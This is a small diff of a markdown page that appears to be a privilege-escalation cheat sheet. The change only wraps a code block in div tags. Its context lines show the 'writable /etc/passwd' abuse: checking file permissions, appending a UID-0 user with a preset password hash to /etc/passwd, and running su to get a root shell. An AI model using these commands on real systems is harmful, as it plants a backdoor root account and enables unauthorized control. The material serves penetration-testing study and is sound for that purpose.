@@ -7,6 +7,8 @@ tags: ["passwd", "shadow", "/etc/passwd", "privesc"]
 ---
 ### Abuse #1: Writable /etc/passwd
 
+<div>
+
 ```bash
 # Check
 ls -l /etc/passwd /etc/shadow
@@ -26,5 +28,7 @@ echo 'user:$1$mQ8Xk.u8$XjFlyg01xLRjhCK/v//Qe/:0:0:comment:/root:/bin/bash' >> /e
 # Get root shell
 su - user
 ```
+
+</div>
 
 <br>
